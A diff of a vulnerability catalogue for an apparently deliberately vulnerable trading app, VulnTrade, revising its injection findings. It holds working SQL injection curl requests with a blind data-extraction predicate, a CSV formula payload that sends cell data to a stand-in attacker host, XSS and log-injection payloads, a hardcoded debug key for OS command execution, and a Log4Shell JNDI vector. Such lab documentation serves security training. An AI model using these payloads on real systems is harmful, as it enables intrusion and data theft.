@@ -7,30 +7,41 @@ VulnTrade has injection vulnerabilities across multiple channels: traditional RE
 
 ## Vulnerabilities
 
-### INJ-01: SQL Injection — Legacy Login Endpoint
+### INJ-01: SQL Injection — Legacy Login Endpoint (Blind / Error-Based)
 | Field | Value |
 |-------|-------|
 | Severity | Critical |
 | OWASP | A03: Injection |
 | CWE | CWE-89 |
-| Difficulty | Beginner |
+| Difficulty | Intermediate |
 | Endpoint | `POST /api/auth/login-legacy` |
-| File | `AuthController.java:119` |
+| File | `AuthController.java:143` |
 
-**Description:** Username is concatenated directly into SQL: `"SELECT * FROM users WHERE username='" + username + "'"`.
+**Description:** Username is concatenated directly into SQL: `"SELECT * FROM users WHERE username = '" + username + "'"` (`AuthController.java:143`), executed via `createNativeQuery` (line 144). The query is fully injectable, **but it is not an authentication bypass**: the app bcrypt-verifies the supplied password against the returned row (line 155), so `' OR '1'='1 --` matches a row and is still rejected on the password check. Exploit it instead as a **boolean-blind oracle** plus an **error-based** channel for data extraction.
 
-**How to exploit:**
+**How to exploit (boolean-blind oracle):**
 ```bash
-# Authentication bypass
+# TRUE  predicate: username = trader1' AND '1'='1  -> row matches -> bcrypt fails -> "Invalid password"
+# FALSE predicate: username = trader1' AND '1'='2  -> no row                     -> "User not found"
 curl -X POST http://localhost:8085/api/auth/login-legacy \
   -H "Content-Type: application/json" \
-  -d '{"username":"admin'\'' OR 1=1 --","password":"anything"}'
+  --data-raw '{"username":"trader1'\'' AND '\''1'\''='\''1","password":"x"}'   # => "Invalid password"
 
-# UNION-based extraction
 curl -X POST http://localhost:8085/api/auth/login-legacy \
   -H "Content-Type: application/json" \
-  -d '{"username":"'\'' UNION SELECT 1,flag_value,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 FROM flags --","password":"x"}'
+  --data-raw '{"username":"trader1'\'' AND '\''1'\''='\''2","password":"x"}'   # => "User not found"
 ```
+Swap the predicate for `SUBSTRING((SELECT flag_value FROM flags LIMIT 1),1,1)='F'` etc. to extract data character by character — the two distinct replies are the oracle.
+
+**How to exploit (error-based):**
+```bash
+# Unbalanced quote -> broken SQL grammar -> HTTP 500 leaking org.hibernate ... SQLGrammarException
+curl -X POST http://localhost:8085/api/auth/login-legacy \
+  -H "Content-Type: application/json" \
+  --data-raw '{"username":"trader1'\''","password":"x"}'
+```
+
+> The `' OR 1=1 --` / UNION-SELECT framing from earlier docs is retained here only as history: the password re-check neutralises the bypass, and a UNION row is likewise fed through the bcrypt check, so the reliable exfiltration channels are the blind oracle and the error-based response above. See [AUTH-02](01-authentication.md) for the same endpoint from the authentication angle.
 
 ---
 
@@ -114,9 +125,9 @@ See [../websocket-sqli-guide.md](../websocket-sqli-guide.md) for detailed STOMP 
 | CWE | CWE-78 |
 | Difficulty | Advanced |
 | Endpoint | `POST /api/debug/execute` |
-| File | `DebugController.java:68` |
+| File | `DebugController.java:79` |
 
-**Description:** Executes OS commands via `Runtime.getRuntime().exec()`. Protected by a hardcoded debug key (`vulntrade-debug-key-2024`) that's discoverable in the source code and config files.
+**Description:** Executes OS commands via `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",command})` (`DebugController.java:79`). Protected only by a hardcoded debug key (`vulntrade-debug-key-2024`, `DebugController.java:27`) that's discoverable in the source code and config files; a wrong key returns 403.
 
 **How to exploit:**
 ```bash
@@ -137,9 +148,9 @@ curl -X POST http://localhost:8085/api/debug/execute \
 | CWE | CWE-117 |
 | Difficulty | Intermediate |
 | Endpoint | `POST /api/admin/adjust-balance` |
-| File | `AuditService.java:36` |
+| File | `AdminService.java:77` |
 
-**Description:** The `reason` field in balance adjustments is logged without sanitization. Newline characters inject fake log entries.
+**Description:** The `reason` field in balance adjustments is written straight into the log line (`AdminService.java:77`) and the audit trail without sanitization. Newline characters inject fake log entries. (Reached with a forged ADMIN role — same weak-secret bypass as INJ-05.)
 
 **Example payload:** `legitimate reason\n[SECURITY] Admin password changed to: hacked123`
 
@@ -154,7 +165,7 @@ curl -X POST http://localhost:8085/api/debug/execute \
 | Difficulty | Intermediate |
 | Endpoint | `GET /api/export/trades` |
 
-**Description:** Trade data exported as CSV can contain formula injection payloads. If a trade symbol or description contains `=CMD()`, it executes when opened in Excel.
+**Description:** Trade data is exported as CSV with no `=+-@` cell escaping. A user-controlled field that lands in a cell — e.g. `clientOrderId` on an order — is written verbatim, so a value like `=HYPERLINK("http://evil.example/?x="&A1,"pwn")` survives into the CSV and executes when opened in Excel/LibreOffice.
 
 ---
 
@@ -166,9 +177,9 @@ curl -X POST http://localhost:8085/api/debug/execute \
 | CWE | CWE-79 |
 | Difficulty | Intermediate |
 | Endpoint | WebSocket `/app/trade.setAlert` |
-| File | `AlertService.java:47` |
+| File | `AlertService.java:56` |
 
-**Description:** Alert symbols are stored without sanitization and broadcast to other users via WebSocket. A malicious symbol like `<img src=x onerror=alert(1)>` persists and renders in other users' browsers.
+**Description:** Alert symbols are stored without sanitization (`AlertService.setSymbol`, `AlertService.java:56`) and echoed/broadcast to users via WebSocket. A malicious symbol like `<img src=x onerror=alert(1)>` persists and renders in the notification UI. The `ALERT_CREATED` reply echoes the payload back byte-for-byte.
 
 ---
 
@@ -179,9 +190,9 @@ curl -X POST http://localhost:8085/api/debug/execute \
 | OWASP | A03: Injection |
 | CWE | CWE-79 |
 | Difficulty | Intermediate |
-| File | `DashboardPage.js:352,356` |
+| File | `DashboardPage.js:375,379` |
 
-**Description:** Symbol names in the market prices table use `dangerouslySetInnerHTML` for rendering. If a symbol name contains HTML/JavaScript, it executes in every user's browser viewing the dashboard.
+**Description:** Symbol and name values in the market prices table use `dangerouslySetInnerHTML` for rendering (`DashboardPage.js:375,379`; the Price Alerts panel does the same at line 624). If a symbol/name contains HTML/JavaScript, it executes in every user's browser viewing the dashboard. This is a frontend-only sink (verified via a browser/Playwright check; **SKIP** in the backend exploit matrix).
 
 ---
 
@@ -194,7 +205,7 @@ curl -X POST http://localhost:8085/api/debug/execute \
 | CVE | CVE-2021-44228 |
 | Difficulty | Advanced |
 | Endpoints | WebSocket `/app/admin.haltTrading`, `/app/admin.adjustBalance`, `/app/trade.setAlert` |
-| Files | `AdminService.java:97`, `AdminService.java:73`, `AlertService.java:53` |
+| Files | `AdminService.java:104`, `AdminService.java:77`, `AlertService.java:62` |
 
 **Description:** VulnTrade uses Log4j2 2.14.1, which is vulnerable to Log4Shell. User-controlled input (the `reason` field in halt/balance operations, the `symbol` field in alerts) flows directly into `logger.info()` calls. Log4j2 resolves `${jndi:ldap://...}` lookups in log messages, causing JNDI injection and Remote Code Execution.
 
@@ -204,9 +215,9 @@ curl -X POST http://localhost:8085/api/debug/execute \
 
 | Vector | STOMP Destination | Payload Field | Log Location |
 |--------|-------------------|---------------|-------------|
-| Halt Trading | `/app/admin.haltTrading` | `reason` | `AdminService.java:97` |
-| Balance Adjustment | `/app/admin.adjustBalance` | `reason` | `AdminService.java:73` |
-| Price Alert | `/app/trade.setAlert` | `symbol` | `AlertService.java:53` |
+| Halt Trading | `/app/admin.haltTrading` | `reason` | `AdminService.java:104` |
+| Balance Adjustment | `/app/admin.adjustBalance` | `reason` | `AdminService.java:77` |
+| Price Alert | `/app/trade.setAlert` | `symbol` | `AlertService.java:62` |
 | Login (username) | `POST /api/auth/login` | `username` | `AuthController.java` |
 
 **How to exploit (full walkthrough):**
